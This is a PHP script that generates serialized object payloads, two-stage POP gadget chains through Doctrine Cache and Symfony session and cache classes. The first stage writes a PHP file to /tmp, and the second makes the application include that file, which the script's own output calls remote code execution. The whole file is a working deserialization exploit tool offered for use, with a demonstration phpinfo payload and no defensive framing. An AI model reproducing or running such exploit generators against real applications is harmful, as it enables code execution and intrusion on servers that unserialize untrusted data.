<?php

require __DIR__.'/vendor/autoload.php';

$code 	= '<?php phpinfo(); ?>';
$filename 	= '/tmp/pwned.txt';

function usage() {
	global $argv;
	return "Usage: $argv[0] <FW|LFI> <outfile>";
}

if ($argc < 3) {
	die(usage());
}


$outfile = $argv[2];
if ($argv[1] === 'FW') {

	$s  = 'O:40:"\\Doctrine\\Common\\Cache\\Psr6\\CacheAdapter":2:{';
	$s .= 's:46:"'.chr(0)."Doctrine\\Common\\Cache\\Psr6\\CacheAdapter".chr(0).'cache";';
	//cache prop
	$s .= 'O:72:"\\Symfony\\Component\\HttpFoundation\\Session\\Storage\\MockFileSessionStorage":5:{';
	$s .= 's:10:"'.chr(0).'*'.chr(0).'started";b:1;';
	$s .= 's:7:"'.chr(0).'*'.chr(0).'data";a:1:{i:0;s:' . strlen(basename($code)) . ':"' . basename($code) . '";}';
	//savePath prop
	$s .= 's:81:"'.chr(0)."Symfony\\Component\\HttpFoundation\\Session\\Storage\\MockFileSessionStorage".chr(0).'savePath";';
	$s .= 's:'. strlen(dirname($filename)) . ':"' . dirname($filename) . '";';
	$s .= 's:5:"'.chr(0).'*'.chr(0).'id";';
	$s .= 's:' . strlen(basename($filename)) . ':"' . basename($filename) . '";';
	$s .= 's:14:"'.chr(0).'*'.chr(0).'metadataBag";';
	$s .= 'O:63:"Symfony\\Component\\HttpFoundation\\Session\\Attribute\\AttributeBag":0:{}';
	$s .= '}';
	//deferredItems prop
	$s .= 's:54:"'.chr(0)."Doctrine\\Common\\Cache\\Psr6\\CacheAdapter".chr(0).'deferredItems";';
	$s .= 'a:1:{s:2:"qq";O:36:"Doctrine\\Common\\Cache\\Psr6\\CacheItem":2:{';
	$s .= 's:44:"'.chr(0)."Doctrine\\Common\\Cache\\Psr6\\CacheItem".chr(0).'expiry";d:1999999999.0;';
	$s .= 's:43:"'.chr(0)."Doctrine\\Common\\Cache\\Psr6\\CacheItem".chr(0).'value";s:0:"";';
	$s .= '}}}';

	echo "Execute POP-chain and enjoy code in ${filename}.mocksess".PHP_EOL;

} else if ($argv[1] === 'LFI') {

	$s  = 'O:40:"\\Doctrine\\Common\\Cache\\Psr6\\CacheAdapter":2:{';
	$s .= 's:46:"'.chr(0)."Doctrine\\Common\\Cache\\Psr6\\CacheAdapter".chr(0).'cache";';
	//cache prop
	$s .= 'O:48:"\\Symfony\\Component\\Cache\\Adapter\\PhpArrayAdapter":1:{';
	$s .= 's:53:"'.chr(0)."Symfony\\Component\\Cache\\Adapter\\PhpArrayAdapter".chr(0).'file";';
	$s .= 's:' . strlen($filename . '.mocksess') . ':"' . $filename . '.mocksess";}';
	//deferredItems prop
	$s .= 's:54:"'.chr(0)."Doctrine\\Common\\Cache\\Psr6\\CacheAdapter".chr(0).'deferredItems";';
	$s .= 'a:1:{s:2:"qq";O:36:"Doctrine\\Common\\Cache\\Psr6\\CacheItem":2:{';
	$s .= 's:44:"'.chr(0)."Doctrine\\Common\\Cache\\Psr6\\CacheItem".chr(0).'expiry";d:1.0;';
	$s .= 's:43:"'.chr(0)."Doctrine\\Common\\Cache\\Psr6\\CacheItem".chr(0).'value";s:0:"";';
	$s .= '}}}';

	echo "Execute POP-chain and get RCE!".PHP_EOL;

} else {
	die(usage());
}

file_put_contents($outfile, $s);